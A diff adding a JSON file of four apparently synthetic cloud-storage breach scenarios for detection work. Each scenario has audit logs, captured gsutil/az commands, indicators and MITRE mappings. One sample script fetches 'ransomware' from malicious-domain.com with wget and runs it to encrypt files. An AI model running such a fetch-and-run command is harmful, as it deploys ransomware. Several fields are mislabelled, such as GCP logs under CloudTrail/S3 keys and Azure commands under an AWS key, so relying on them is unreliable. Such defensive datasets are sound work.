@@ -1,0 +1,260 @@
+{
+  "samples": [
+    {
+      "scenario": "Google Cloud Storage bucket misconfigured with public read access allowing unauthorized users to download sensitive project files.",
+      "technical_data": {
+        "iam_policy": {
+          "bindings": [
+            {
+              "role": "roles/storage.objectViewer",
+              "members": [
+                "allUsers"
+              ]
+            }
+          ]
+        },
+        "cloudtrail_log_entry": null,
+        "gcp_audit_log_entry": {
+          "protoPayload": {
+            "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
+            "authenticationInfo": {
+              "principalEmail": "unknown@external.com"
+            },
+            "requestMetadata": {
+              "callerIp": "198.51.100.77",
+              "userAgent": "gsutil/4.64"
+            },
+            "serviceName": "storage.googleapis.com",
+            "methodName": "storage.objects.get",
+            "resourceName": "projects/_/buckets/confidential-gcp-bucket/objects/internal_design.pdf",
+            "status": {},
+            "request": {
+              "bucket": "confidential-gcp-bucket",
+              "object": "internal_design.pdf"
+            },
+            "response": {}
+          },
+          "timestamp": "2024-06-12T11:22:33Z",
+          "severity": "INFO"
+        },
+        "gcs_access_log_entry": "198.51.100.77 - - [12/Jun/2024:11:22:33 +0000] \"GET /confidential-gcp-bucket/internal_design.pdf HTTP/1.1\" 200 1048576 \"-\" \"gsutil/4.64\"",
+        "suspicious_downloaded_file_sample": "%PDF-1.7\n%\u00e2\u00e3\u00cf\u00d3\n1 0 obj\n<<\n/Title (Q2 Project Design)\n/Author (Engineering Team)\n>>",
+        "gcloud_cli_commands_captured": [
+          "gsutil cp gs://confidential-gcp-bucket/internal_design.pdf ./",
+          "gsutil ls -r gs://confidential-gcp-bucket/**"
+        ],
+        "bucket_acl": [
+          {
+            "entity": "allUsers",
+            "role": "READER"
+          }
+        ]
+      },
+      "indicators": [
+        "GCS bucket IAM policy granting roles/storage.objectViewer to allUsers",
+        "Audit log showing external IP performing storage.objects.get on sensitive files",
+        "Access logs capturing GET requests from unknown external IPs",
+        "Sensitive internal design documents downloaded without authentication",
+        "Bucket ACL includes public read access"
+      ],
+      "detection_method": "Regular audits of GCS bucket IAM policies with automated tools like Forseti Security; Monitoring GCP audit logs and alerting on storage.objects.get by unknown or external users; Analyzing access logs for unusual IP addresses accessing sensitive buckets; Implementing DLP to detect sensitive data exfiltration.",
+      "relevant_mitre_techniques": [
+        "T1530 - Data from Cloud Storage Object",
+        "T1078 - Valid Accounts (Anonymous or public access)",
+        "T1083 - File and Directory Discovery",
+        "T1552 - Unsecured Credentials"
+      ]
+    },
+    {
+      "scenario": "Azure Blob Storage container configured with public read and list permissions, exposing confidential financial reports to unauthorized internet users.",
+      "technical_data": {
+        "iam_policy": {
+          "public_access_level": "Blob",
+          "access_policies": []
+        },
+        "azure_activity_log_entry": {
+          "authorization": {
+            "action": "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read",
+            "scope": "/subscriptions/abcd1234-5678-90ef-ghij-klmnopqrstuv/resourceGroups/FinanceRG/providers/Microsoft.Storage/storageAccounts/financestorageaccount/blobServices/default/containers/confidential-reports/blobs/Q2_financials.xlsx"
+          },
+          "caller": "anonymous",
+          "eventTimestamp": "2024-06-15T09:45:12Z",
+          "category": "Administrative",
+          "operationName": "Read Blob",
+          "resourceId": "/subscriptions/abcd1234-5678-90ef-ghij-klmnopqrstuv/resourceGroups/FinanceRG/providers/Microsoft.Storage/storageAccounts/financestorageaccount/blobServices/default/containers/confidential-reports",
+          "status": "Succeeded",
+          "claims": {
+            "aud": "https://storage.azure.com/",
+            "scp": "user_impersonation"
+          },
+          "ipAddress": "192.0.2.101",
+          "userAgent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
+        },
+        "azure_storage_access_log_entry": "192.0.2.101 - - [15/Jun/2024:09:45:12 +0000] \"GET /financestorageaccount/confidential-reports/Q2_financials.xlsx HTTP/1.1\" 200 5242880 \"-\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)\"",
+        "suspicious_downloaded_file_sample": "<Workbook>\n  <Sheet name=\"Q2\">\n    <Row><Cell>Revenue</Cell><Cell>1000000</Cell></Row>\n    <Row><Cell>Expenses</Cell><Cell>750000</Cell></Row>\n  </Sheet>\n</Workbook>",
+        "azure_cli_commands_captured": [
+          "az storage blob download --container-name confidential-reports --name Q2_financials.xlsx --file ./Q2_financials.xlsx --account-name financestorageaccount",
+          "az storage container set-permission --name confidential-reports --public-access blob --account-name financestorageaccount"
+        ],
+        "container_properties": {
+          "publicAccess": "Blob",
+          "hasImmutabilityPolicy": false,
+          "hasLegalHold": false
+        }
+      },
+      "indicators": [
+        "Azure Blob container public access level set to Blob allowing anonymous read and list",
+        "Activity logs showing anonymous caller reading confidential financial data",
+        "Storage access logs with GET requests from external IP addresses",
+        "Confidential financial reports downloaded without authentication",
+        "CLI commands setting public access on container"
+      ],
+      "detection_method": "Enforce Azure Policy to restrict public access on storage containers; Monitor Azure Activity Logs for anonymous or unexpected blob read operations; Analyze storage logs for data access patterns from unknown IPs; Use DLP to scan downloaded content for sensitive financial information.",
+      "relevant_mitre_techniques": [
+        "T1530 - Data from Cloud Storage Object",
+        "T1078 - Valid Accounts (Anonymous access)",
+        "T1083 - File and Directory Discovery",
+        "T1552 - Unsecured Credentials"
+      ]
+    },
+    {
+      "scenario": "Google Cloud Storage bucket configured with public read and write access, allowing unauthorized users to upload malware and exfiltrate sensitive logs.",
+      "technical_data": {
+        "iam_policy": {
+          "bindings": [
+            {
+              "role": "roles/storage.objectViewer",
+              "members": [
+                "allUsers"
+              ]
+            },
+            {
+              "role": "roles/storage.objectCreator",
+              "members": [
+                "allUsers"
+              ]
+            }
+          ]
+        },
+        "cloudtrail_log_entry": {
+          "eventVersion": "1.08",
+          "userIdentity": {
+            "type": "Anonymous",
+            "principalId": "ANONYMOUS"
+          },
+          "eventTime": "2024-06-11T09:15:30Z",
+          "eventSource": "storage.googleapis.com",
+          "eventName": "storage.objects.insert",
+          "region": "us-central1",
+          "sourceIPAddress": "198.51.100.77",
+          "userAgent": "gsutil/5.0 Python/3.10.6",
+          "requestParameters": {
+            "bucketName": "enterprise-logs-bucket",
+            "objectName": "malicious_uploads/ransomware_payload.sh"
+          },
+          "responseElements": {
+            "etag": "CK+9xPjN8O8CEAE="
+          },
+          "requestID": "CK+9xPjN8O8CEAE=",
+          "eventType": "ApiCall",
+          "recipientAccountId": "987654321098"
+        },
+        "s3_access_log_entry": "198.51.100.77 - - [11/Jun/2024:09:15:30 +0000] \"POST /enterprise-logs-bucket/malicious_uploads/ransomware_payload.sh HTTP/1.1\" 200 - - - \"gsutil/5.0 Python/3.10.6\" -",
+        "suspicious_uploaded_file_sample": "#!/bin/bash\nwget http://malicious-domain.com/ransomware -O /tmp/ransomware\nchmod +x /tmp/ransomware\n/tmp/ransomware --encrypt",
+        "aws_cli_commands_captured": [
+          "gsutil cp ./ransomware_payload.sh gs://enterprise-logs-bucket/malicious_uploads/",
+          "gsutil ls gs://enterprise-logs-bucket/logs/"
+        ],
+        "bucket_acl": {
+          "owner": {
+            "entity": "project-owners-987654321098",
+            "entityId": "project-owners-987654321098"
+          },
+          "acl": [
+            {
+              "entity": "allUsers",
+              "role": "READER"
+            },
+            {
+              "entity": "allUsers",
+              "role": "WRITER"
+            }
+          ]
+        }
+      },
+      "indicators": [
+        "GCS bucket IAM bindings granting roles/storage.objectViewer and roles/storage.objectCreator to allUsers",
+        "CloudTrail event showing Anonymous user inserting objects into bucket",
+        "Access logs indicating POST requests from external IPs uploading executable scripts",
+        "Uploaded files containing malware payload scripts",
+        "Bucket ACL allowing WRITE permissions to allUsers group"
+      ],
+      "detection_method": "Implement automated scanning of GCS bucket IAM policies to detect overly permissive roles; Cloud Audit Logs monitoring for anonymous object insertions; Access log analysis to alert on uploads from external IPs; Behavioral analysis on uploaded scripts for malware signatures; Enforce bucket-level public access prevention policies.",
+      "relevant_mitre_techniques": [
+        "T1530 - Data from Cloud Storage Object",
+        "T1078 - Valid Accounts (Anonymous access)",
+        "T1204 - User Execution",
+        "T1059 - Command and Scripting Interpreter",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Azure Blob Storage container with container-level public access enabled, allowing anonymous users to read sensitive financial reports and upload unauthorized files.",
+      "technical_data": {
+        "iam_policy": {
+          "accessPolicies": [],
+          "publicAccess": "Blob"
+        },
+        "cloudtrail_log_entry": {
+          "eventVersion": "1.08",
+          "userIdentity": {
+            "type": "Anonymous",
+            "principalId": "ANONYMOUS"
+          },
+          "eventTime": "2024-06-12T18:47:22Z",
+          "eventSource": "blob.core.windows.net",
+          "eventName": "PutBlob",
+          "azureRegion": "eastus",
+          "sourceIPAddress": "192.0.2.120",
+          "userAgent": "AzCopy/10.15.0 Azure-Storage/0.11 (go1.16; windows)",
+          "requestParameters": {
+            "containerName": "financial-reports",
+            "blobName": "unauthorized_uploads/phishing_doc.docx"
+          },
+          "responseElements": {
+            "requestId": "5d59e3f9-301e-0056-0a96-7e9b3f000000",
+            "version": "2021-06-08"
+          },
+          "requestID": "5d59e3f9-301e-0056-0a96-7e9b3f000000",
+          "eventType": "ApiCall",
+          "recipientAccountId": "555555555555"
+        },
+        "s3_access_log_entry": "192.0.2.120 - - [12/Jun/2024:18:47:22 +0000] \"PUT /financial-reports/unauthorized_uploads/phishing_doc.docx HTTP/1.1\" 201 - - - \"AzCopy/10.15.0 Azure-Storage/0.11 (go1.16; windows)\" -",
+        "suspicious_uploaded_file_sample": "This document contains a macro that attempts to steal user credentials by sending them to attacker-controlled endpoint.",
+        "aws_cli_commands_captured": [
+          "az storage blob upload --container-name financial-reports --name unauthorized_uploads/phishing_doc.docx --file phishing_doc.docx",
+          "az storage blob download --container-name financial-reports --name Q2_financials.xlsx --file local_Q2_financials.xlsx"
+        ],
+        "bucket_acl": {
+          "publicAccess": "Blob",
+          "signedIdentifiers": []
+        }
+      },
+      "indicators": [
+        "Azure Blob Storage container public access level set to Blob, allowing anonymous read and write",
+        "Audit logs showing Anonymous users performing PutBlob operations",
+        "Access logs indicating PUT requests from unknown IPs uploading files with malicious macros",
+        "Presence of unauthorized files with embedded credential-stealing macros",
+        "No access policies restricting public write access"
+      ],
+      "detection_method": "Use Azure Security Center and Azure Policy to enforce private container access; Monitor Azure Storage logs for anonymous or suspicious blob uploads; Implement Content Inspection and Endpoint Protection scanning uploaded documents for malicious macros; Configure alerts for public access level changes and anonymous write operations.",
+      "relevant_mitre_techniques": [
+        "T1530 - Data from Cloud Storage Object",
+        "T1078 - Valid Accounts (Anonymous access)",
+        "T1204 - User Execution",
+        "T1055 - Process Injection",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    }
+  ]
+}
